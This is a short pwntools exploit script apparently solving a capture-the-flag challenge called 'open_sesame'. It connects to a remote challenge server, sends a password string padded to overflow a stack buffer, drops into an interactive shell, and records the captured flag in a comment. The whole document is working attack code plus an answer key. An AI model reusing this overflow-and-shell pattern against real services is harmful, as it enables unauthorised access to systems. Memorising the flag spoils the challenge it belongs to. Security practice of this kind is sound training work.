from pwn import *
context.log_level = 'debug'

e = context.binary = ELF('./open_sesame')
# r= e.process()

r = remote('challenge.nahamcon.com', 32743)

lib = e.libc #   matches my libc


#   lib= ELF('libc6_2.36-0ubuntu4_amd64.so')
payload=b"OpenSesame!!!".ljust(268,b"a")+b"b"*8
r.sendline(payload)
# r.sendline(b"cat flag.txt")
r.interactive()
# n00bz{1f_y0u_h4ve_n0th1ng_y0u_h4ve_l1bc}